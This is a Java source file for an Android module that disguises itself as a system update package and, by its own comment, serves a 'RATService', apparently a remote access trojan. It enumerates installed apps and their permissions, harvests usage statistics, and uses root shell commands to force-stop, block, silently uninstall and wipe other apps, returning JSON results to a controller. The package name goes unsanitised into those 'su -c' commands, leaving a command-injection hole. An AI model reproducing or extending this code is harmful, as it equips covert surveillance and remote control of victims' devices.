package com.android.system.update.modules;

import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class AppManagerModule {
    private static final String TAG = "AppManagerModule";
    private final Context context;
    private final PackageManager packageManager;
    private final ActivityManager activityManager;
    private UsageStatsManager usageStatsManager;

    private final Set<String> blockedPackages = new HashSet<>();

    public AppManagerModule(Context context) {
        this.context = context;
        this.packageManager = context.getPackageManager();
        this.activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            this.usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        }
        loadBlockedPackages();
    }

    // ── Persistence ───────────────────────────────────────────────────────────

    private void loadBlockedPackages() {
        SharedPreferences prefs =
            context.getSharedPreferences("app_manager_prefs", Context.MODE_PRIVATE);
        Set<String> saved = prefs.getStringSet("blocked_packages", new HashSet<>());
        blockedPackages.addAll(saved);
    }

    private void saveBlockedPackages() {
        SharedPreferences prefs =
            context.getSharedPreferences("app_manager_prefs", Context.MODE_PRIVATE);
        prefs.edit().putStringSet("blocked_packages", new HashSet<>(blockedPackages)).apply();
    }

    // ── List installed apps ───────────────────────────────────────────────────

    public String listInstalledApps(boolean includeSystemApps) {
        try {
            List<ApplicationInfo> allApps =
                packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

            JSONArray appsArray = new JSONArray();

            for (ApplicationInfo appInfo : allApps) {
                boolean isSystemApp = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                if (!includeSystemApps && isSystemApp) continue;
                appsArray.put(buildAppJson(appInfo, false));
            }

            Log.d(TAG, "listInstalledApps: " + appsArray.length()
                + " apps (includeSystem=" + includeSystemApps + ")");

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", appsArray.length());
            result.put("apps", appsArray);
            result.put("timestamp", System.currentTimeMillis());
            return result.toString();

        } catch (JSONException e) {
            Log.e(TAG, "listInstalledApps error", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── App info ──────────────────────────────────────────────────────────────

    public String getAppInfo(String packageName) {
        try {
            ApplicationInfo appInfo = packageManager.getApplicationInfo(
                packageName, PackageManager.GET_META_DATA);

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("app", buildAppJson(appInfo, true));
            return result.toString();

        } catch (PackageManager.NameNotFoundException e) {
            return "{\"success\":false,\"error\":\"App not found: " + packageName + "\"}";
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Shared JSON builder ───────────────────────────────────────────────────

    private JSONObject buildAppJson(ApplicationInfo appInfo, boolean detailed)
            throws JSONException {

        JSONObject j = new JSONObject();
        j.put("packageName", appInfo.packageName);

        String appName;
        try { appName = packageManager.getApplicationLabel(appInfo).toString(); }
        catch (Exception e) { appName = appInfo.packageName; }
        j.put("name", appName);

        j.put("version", getAppVersion(appInfo.packageName));
        j.put("isSystem", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
        j.put("isUpdatedSystemApp",
            (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
        j.put("isEnabled", isAppEnabled(appInfo.packageName));
        j.put("uid", appInfo.uid);
        j.put("targetSdk", appInfo.targetSdkVersion);
        j.put("isRunning", isAppRunning(appInfo.packageName));
        j.put("isBlocked", blockedPackages.contains(appInfo.packageName));

        try {
            PackageInfo pi = packageManager.getPackageInfo(appInfo.packageName, 0);
            j.put("installTime", pi.firstInstallTime);
            j.put("updateTime", pi.lastUpdateTime);
        } catch (Exception e) {
            j.put("installTime", 0);
            j.put("updateTime", 0);
        }

        if (detailed) {
            j.put("dataDir",          appInfo.dataDir != null ? appInfo.dataDir : "");
            j.put("sourceDir",        appInfo.sourceDir != null ? appInfo.sourceDir : "");
            j.put("nativeLibraryDir", appInfo.nativeLibraryDir != null ? appInfo.nativeLibraryDir : "");

            JSONArray permissions = new JSONArray();
            try {
                PackageInfo pi = packageManager.getPackageInfo(
                    appInfo.packageName, PackageManager.GET_PERMISSIONS);
                if (pi.requestedPermissions != null)
                    for (String perm : pi.requestedPermissions) {
                        JSONObject p = new JSONObject();
                        p.put("name", perm);
                        permissions.put(p);
                    }
            } catch (Exception ignored) {}
            j.put("permissions", permissions);

            JSONArray activities = new JSONArray();
            try {
                PackageInfo pi = packageManager.getPackageInfo(
                    appInfo.packageName, PackageManager.GET_ACTIVITIES);
                if (pi.activities != null)
                    for (android.content.pm.ActivityInfo a : pi.activities)
                        activities.put(a.name);
            } catch (Exception ignored) {}
            j.put("activities", activities);

            JSONArray services = new JSONArray();
            try {
                PackageInfo pi = packageManager.getPackageInfo(
                    appInfo.packageName, PackageManager.GET_SERVICES);
                if (pi.services != null)
                    for (android.content.pm.ServiceInfo s : pi.services)
                        services.put(s.name);
            } catch (Exception ignored) {}
            j.put("services", services);

            JSONArray receivers = new JSONArray();
            try {
                PackageInfo pi = packageManager.getPackageInfo(
                    appInfo.packageName, PackageManager.GET_RECEIVERS);
                if (pi.receivers != null)
                    for (android.content.pm.ActivityInfo r : pi.receivers)
                        receivers.put(r.name);
            } catch (Exception ignored) {}
            j.put("receivers", receivers);
        }

        return j;
    }

    // ── Force stop ────────────────────────────────────────────────────────────

    public String forceStopApp(String packageName) {
        try {
            activityManager.killBackgroundProcesses(packageName);
            tryRoot("am force-stop " + packageName);

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "App force stopped");
            result.put("packageName", packageName);
            return result.toString();
        } catch (Exception e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Block / unblock ───────────────────────────────────────────────────────

    public String blockApp(String packageName, boolean block) {
        try {
            if (block) {
                blockedPackages.add(packageName);
                saveBlockedPackages();
                boolean disabled = tryRoot("pm disable-user --user 0 " + packageName);
                if (!disabled) activityManager.killBackgroundProcesses(packageName);
                tryRoot("am force-stop " + packageName);
            } else {
                blockedPackages.remove(packageName);
                saveBlockedPackages();
                tryRoot("pm enable " + packageName);
            }

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("packageName", packageName);
            result.put("blocked", block);
            result.put("message", block ? "App blocked" : "App unblocked");
            return result.toString();

        } catch (Exception e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Enforce blocks (call periodically from RATService) ────────────────────

    public void enforceBlocks() {
        for (String pkg : new HashSet<>(blockedPackages)) {
            if (isAppRunning(pkg)) {
                activityManager.killBackgroundProcesses(pkg);
                tryRoot("am force-stop " + pkg);
                Log.d(TAG, "Enforced block: " + pkg);
            }
        }
    }

    // ── Uninstall ─────────────────────────────────────────────────────────────

    public String uninstallApp(String packageName, boolean silent) {
        try {
            if (silent) {
                boolean ok = tryRoot("pm uninstall " + packageName);
                JSONObject result = new JSONObject();
                result.put("success", ok);
                result.put("message", ok
                    ? "App silently uninstalled"
                    : "Silent uninstall failed — root required");
                return result.toString();
            } else {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Uninstall dialog launched on device");
                return result.toString();
            }
        } catch (Exception e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Usage stats ───────────────────────────────────────────────────────────

    public String getAppUsageStats(int days) {
        JSONArray statsArray = new JSONArray();

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            try {
                JSONObject r = new JSONObject();
                r.put("success", false);
                r.put("error", "Usage stats require Android 5.0+");
                r.put("stats", statsArray);
                return r.toString();
            } catch (JSONException e) { return "{\"success\":false}"; }
        }

        try {
            long end   = System.currentTimeMillis();
            long start = end - TimeUnit.DAYS.toMillis(days);

            List<UsageStats> list = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, start, end);

            if (list != null) {
                Collections.sort(list, (a, b) ->
                    Long.compare(b.getTotalTimeInForeground(),
                                 a.getTotalTimeInForeground()));

                for (UsageStats s : list) {
                    if (s.getTotalTimeInForeground() <= 0) continue;
                    JSONObject j = new JSONObject();
                    j.put("packageName", s.getPackageName());
                    try {
                        ApplicationInfo ai = packageManager.getApplicationInfo(
                            s.getPackageName(), 0);
                        j.put("appName", packageManager.getApplicationLabel(ai));
                    } catch (Exception e) {
                        j.put("appName", s.getPackageName());
                    }
                    j.put("totalTimeInForeground", s.getTotalTimeInForeground());
                    j.put("totalTimeInForegroundFormatted",
                        formatTime(s.getTotalTimeInForeground()));
                    j.put("lastTimeUsed", s.getLastTimeUsed());
                    j.put("lastTimeUsedFormatted", formatTimestamp(s.getLastTimeUsed()));
                    statsArray.put(j);
                }
            }

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("days", days);
            result.put("count", statsArray.length());
            result.put("stats", statsArray);
            return result.toString();

        } catch (Exception e) {
            Log.e(TAG, "getAppUsageStats error", e);
            try {
                JSONObject r = new JSONObject();
                r.put("success", false);
                r.put("error", e.getMessage());
                r.put("stats", statsArray);
                return r.toString();
            } catch (JSONException ex) { return "{\"success\":false}"; }
        }
    }

    // ── Running apps ──────────────────────────────────────────────────────────

    public String getRunningApps() {
        try {
            List<ActivityManager.RunningAppProcessInfo> procs =
                activityManager.getRunningAppProcesses();

            JSONArray arr = new JSONArray();
            Set<String> seen = new HashSet<>();

            if (procs != null) {
                for (ActivityManager.RunningAppProcessInfo proc : procs) {
                    for (String pkg : proc.pkgList) {
                        if (!seen.add(pkg)) continue;
                        JSONObject j = new JSONObject();
                        j.put("packageName", pkg);
                        try {
                            ApplicationInfo ai = packageManager.getApplicationInfo(pkg, 0);
                            j.put("appName", packageManager.getApplicationLabel(ai));
                        } catch (Exception e) { j.put("appName", pkg); }
                        j.put("pid", proc.pid);
                        j.put("processName", proc.processName);
                        j.put("importance", proc.importance);
                        j.put("isBlocked", blockedPackages.contains(pkg));
                        arr.put(j);
                    }
                }
            }

            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", arr.length());
            result.put("apps", arr);
            return result.toString();

        } catch (Exception e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Blocked apps list ─────────────────────────────────────────────────────

    public String getBlockedApps() {
        try {
            JSONArray arr = new JSONArray();
            for (String pkg : blockedPackages) {
                JSONObject j = new JSONObject();
                j.put("packageName", pkg);
                try {
                    ApplicationInfo ai = packageManager.getApplicationInfo(pkg, 0);
                    j.put("appName", packageManager.getApplicationLabel(ai));
                } catch (Exception e) { j.put("appName", pkg); }
                j.put("isRunning", isAppRunning(pkg));
                arr.put(j);
            }
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("count", arr.length());
            result.put("apps", arr);
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Clear app data ────────────────────────────────────────────────────────

    public String clearAppData(String packageName) {
        try {
            boolean ok = tryRoot("pm clear " + packageName);
            JSONObject result = new JSONObject();
            result.put("success", ok);
            result.put("message", ok ? "App data cleared" : "Failed — root required");
            result.put("packageName", packageName);
            return result.toString();
        } catch (Exception e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private boolean isAppEnabled(String packageName) {
        try {
            int state = packageManager.getApplicationEnabledSetting(packageName);
            return state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                || state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT;
        } catch (Exception e) { return true; }
    }

    private boolean isAppRunning(String packageName) {
        List<ActivityManager.RunningAppProcessInfo> procs =
            activityManager.getRunningAppProcesses();
        if (procs == null) return false;
        for (ActivityManager.RunningAppProcessInfo proc : procs)
            for (String pkg : proc.pkgList)
                if (pkg.equals(packageName)) return true;
        return false;
    }

    private String getAppVersion(String packageName) {
        try { return packageManager.getPackageInfo(packageName, 0).versionName; }
        catch (Exception e) { return "Unknown"; }
    }

    private boolean tryRoot(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            return p.waitFor() == 0;
        } catch (Exception e) {
            Log.w(TAG, "tryRoot failed: " + cmd + " — " + e.getMessage());
            return false;
        }
    }

    private String formatTime(long millis) {
        long h = TimeUnit.MILLISECONDS.toHours(millis);
        long m = TimeUnit.MILLISECONDS.toMinutes(millis) % 60;
        long s = TimeUnit.MILLISECONDS.toSeconds(millis) % 60;
        if (h > 0) return h + "h " + m + "m";
        if (m > 0) return m + "m " + s + "s";
        return s + "s";
    }

    private String formatTimestamp(long ts) {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(ts));
    }
}
